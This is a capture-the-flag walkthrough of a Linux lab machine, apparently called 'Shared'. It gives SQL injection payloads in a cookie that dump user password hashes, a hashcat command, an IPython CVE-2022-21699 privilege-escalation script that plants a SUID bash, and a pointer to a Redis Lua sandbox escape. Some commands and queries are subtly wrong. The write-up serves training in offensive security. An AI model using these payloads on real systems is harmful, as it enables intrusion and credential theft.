# Shared
### Medium linux box

##### Start with an nmap scan:
![alt-text](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FsixO74ZQmWWjbatdV7WQ%2Fuploads%2FvunymQaGuIELhAVfpFNU%2Fnmapscan.jpg?alt=media&token=36d6168c-845f-4150-be68-ecfc1a51dd68 "nmap results")

##### Visit port 80 and navigate to the checkout page. There's a URL encoded cookie named `custom_cart=`. Decode the cookie and note it's format: `<Item>:<Quantity>`

##### The cookie ended up being vulnerable to SQLi. Portswigger's sqli courses helped a lot here. URL encode the payload.

#### `' UNION SELECT 1 -- -` No values
#### `' UNION SELECT 1,2 -- -` No values
#### `' UNION SELECT 1,2,3 -- -` Values are reflected!
![alt-text](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FsixO74ZQmWWjbatdV7WQ%2Fuploads%2FiMA8il58YnoiSfSBNhwv%2FBURPCOOKIESQL.jpg?alt=media&token=ca2f7673-855a-4e73-9e13-626d989795d6)

### SQLi payloads:
##### Find current database:
#### `' UNION SELECT 1,database(),3 -- -`
##### Get tables in checkout database:
#### `'UNION SELECT 1,group_concat(table_name),3 from information_schema.tables WHERE table_schema='checkout' -- -`
##### Enumerate columns in user table from the checkout database:
#### `' UNION SELECT 1,group_concat(column_name),3 from information_schema.tables WHERE table_schema='user' -- -`
##### Get values from the user table:
#### `' UNION SELECT 1,group_concat(id, ':', password),3 from checkout.user -- -`

##### Finally, we get a hash that we can crack! I used hashcat
#### `hashcat -a -0 -m -0 <hash> <wordlist>`

##### ssh into the james_mason account with the cracked password

### Privilege Escalation
##### Transfer pspy64 and linpeas to the machine to see running processes and find sensitive files.
##### We find ipython and an interesting file, `/opt/scripts_review`. It reveals a cronjob being every minute by `dan_smith`
```bash
/bin/sh -c
/usr/bin/pkill ipython;
cd opt/scripts review/ && /usr/local/bin/ipython
```
##### Looking more into ipython, I found CVE-2022-21699. "Arbitrary code execution vulnerability in IPython that stems from IPython executing untrusted files in CWD. This vulnerability allows one user to run code as another"
#####   1. Based on the cronjob ipython is executed at `/opt/scripts_review` directory where we have write access
#####   2. We have to create `/opt/scriptsreview/profile_default` and `opt/scripts_review/profile_default/startup`
#####   3. Create a python script to set `dan_smith` SUID bit to `/bin/bash` for us to escalate priveleges at `/opt/scripts_review/profile_default/startup`
#### Make ascript that creates a directory and another python script that executes `script.sh`
```bash
james_mason@shared:/tmp$ cat script.sh
mkdir -m 777 /opt/scripts_review/profile_default
mkdir -m 777 /opt/scripts_review/profile_default/startup
echo 'import os; os.system("cp /bin/bash /tmp/danbash; chmod u+s /tmp/danbash")' > /opt/scripts_review/profile_default/startup/foo.py
james_mason@shared: /tmp$ chmod +x script.sh
james_mason@shared: /tmp$ ./script.sh
```
![alt-text](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FsixO74ZQmWWjbatdV7WQ%2Fuploads%2FiHCOT3FpQ65fr8Iq6a5t%2Fimage.png?alt=media&token=188fb7a8-1648-49d5-bfdd-b4b9e7dc80cb "script.sh")

##### Keep running `script.sh` because there's a cronjob running as root that deletes everything in `scripts_review`. Wait for the cronjob to execute and create `danbash`. Then execute `danbash`

```bash
james_mason@shared: /tmp$ ./danbash -p
```
##### From there you can copy the ssh key for `dan_smith` and ssh into the account for a better shell
![alt-text](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FsixO74ZQmWWjbatdV7WQ%2Fuploads%2FRENhkyRf5bpOe4mSigPK%2Fimage.png?alt=media&token=d22f0e92-ee4f-48ae-bfa5-dd01ac9eb785 "id_rsa")

### Redis Lua Sandbox Escape and RCE to get root
##### Upload and run linpeas and you'll find a readable file in `/usr/local/bin/redis_connector_dev`
##### It's a ELF file, when executed it connects to `redis-cli` using a password. It will then execute an `INFO` command
##### Transfer `redis_connector_dev` to your machine. Run a nc listener and you should get a password

##### Helpful guide to the exploit below
[title](https://github.com/vulhub/vulhub/blob/master/redis/CVE-2022-0543/README.md)






